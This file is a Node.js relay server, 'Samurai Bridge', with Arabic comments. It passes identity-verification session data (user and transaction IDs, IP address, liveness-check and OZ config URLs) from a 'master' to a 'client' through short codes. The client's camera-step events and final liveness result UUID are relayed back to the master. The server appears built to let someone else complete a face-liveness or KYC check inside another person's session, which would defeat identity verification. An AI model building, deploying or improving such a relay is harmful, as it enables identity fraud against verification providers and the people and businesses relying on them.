const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();
// السماح بطلبات من جميع النطاقات (CORS)
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// خريطة لتخزين اتصالات الماستر النشطة (session_id -> WebSocket)
const activeMasters = new Map();
// خريطة لتخزين بيانات الجلسات القصيرة في ذاكرة السيرفر (shortCode -> sessionData)
const shortSessions = new Map();

// ==========================================
// 1. قسم الماستر (WebSocket) لتتبع الخطوات
// ==========================================
wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            // عندما يرسل الماستر طلب تسجيل الجلسة باستخدام الكود القصير
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                activeMasters.set(data.session_id, ws);
                console.log(`[MASTER LINKED] Session ID: ${data.session_id}`);

                // تنظيف الاتصال عند خروج الماستر
                ws.on('close', () => {
                    activeMasters.delete(data.session_id);
                    console.log(`[MASTER DISCONNECTED] Session ID: ${data.session_id}`);
                });
            }
        } catch (err) {
            console.error('WebSocket parsing error:', err);
        }
    });
});

// ==========================================
// 2. نظام الروابط القصيرة وحفظ البيانات
// ==========================================

// أ: مسار لإنشاء كود قصير وحفظ بيانات العميل (يستدعيه الماستر)
app.post('/create-short-link', (req, res) => {
    const { sessionData } = req.body;
    if (!sessionData) {
        return res.status(400).json({ error: "No session data provided" });
    }

    // 🔥 التعديل هنا: استخراج الروابط الجديدة صراحة لضمان حفظها بشكل صحيح وآمن
    const newSession = {
        user_id: sessionData.user_id,
        transaction_id: sessionData.transaction_id,
        ip_address: sessionData.ip_address,
        plugin_liveness_url: sessionData.plugin_liveness_url,
        challenge_url: sessionData.challenge_url,
        check_id: sessionData.check_id,
        config_url: sessionData.config_url || null, // الرابط الأول (config.php)
        init_url: sessionData.init_url || null      // الرابط الثاني (init.php)
    };

    // توليد كود عشوائي من 6 أحرف وأرقام
    const shortCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    
    // حفظ البيانات في السيرفر وربطها بالكود
    shortSessions.set(shortCode, newSession);
    console.log(`[SESSION CREATED] Short Code: ${shortCode} | Includes OZ URLs: ${!!newSession.config_url}`);

    // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة
    setTimeout(() => {
        shortSessions.delete(shortCode);
        console.log(`[SESSION EXPIRED] Short Code deleted: ${shortCode}`);
    }, 15 * 60 * 1000);

    res.json({ success: true, shortCode: shortCode });
});

// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه العميل)
app.get('/get-session-data/:code', (req, res) => {
    const code = req.params.code;
    const data = shortSessions.get(code);

    if (data) {
        res.json({ success: true, data: data });
    } else {
        res.status(404).json({ success: false, error: "Session expired or invalid" });
    }
});

// ==========================================
// 3. قسم العميل (HTTP POST) لإرسال النتائج
// ==========================================
app.post('/', (req, res) => {
    const { session_id, type, payload, reason } = req.body;

    if (!session_id) {
        return res.status(400).json({ success: false, error: 'Missing session_id' });
    }

    // البحث عن الماستر المرتبط بهذه الجلسة (session_id هو الكود القصير)
    const masterWs = activeMasters.get(session_id);
    const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;

    // الحالة أ: العميل أرسل النتيجة النهائية المشفرة (UUID)
    if (payload) {
        try {
            // فك التشفير (Base64) واستخراج الـ UUID
            const decodedStr = Buffer.from(payload, 'base64').toString('utf-8');
            const parsedPayload = JSON.parse(decodedStr);
            const uuid = parsedPayload.result;

            if (isMasterConnected) {
                masterWs.send(JSON.stringify({
                    type: 'UUID_RECEIVED',
                    uuid: uuid
                }));
            }
            console.log(`[SUCCESS] UUID received and forwarded for session: ${session_id}`);
            return res.json({ success: true }); // الرد على العميل بالنجاح
        } catch (err) {
            console.error('Payload decoding error:', err);
            return res.status(500).json({ success: false, error: 'Invalid payload formatting' });
        }
    }

    // الحالة ب: العميل يرسل خطوات التتبع (تفعيل الكاميرا، أخطاء، الخ...)
    if (type) {
        if (isMasterConnected) {
            masterWs.send(JSON.stringify({
                type: type,
                reason: reason || null
            }));
        }
        return res.json({ success: true });
    }

    return res.status(400).json({ success: false, error: 'Invalid request body' });
});

// ==========================================
// 4. مسار الفحص (Health Check)
// ==========================================
app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: monospace; padding: 50px; text-align: center; background: #000; color: #00ff9d; height: 100vh;">
            <h1>SAMURAI BRIDGE SERVER IS ONLINE 🚀</h1>
            <p>System is running securely...</p>
        </div>
    `);
});

// ==========================================
// 5. تشغيل السيرفر
// ==========================================
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`[SERVER] Samurai Bridge listening on port ${PORT}`);
});
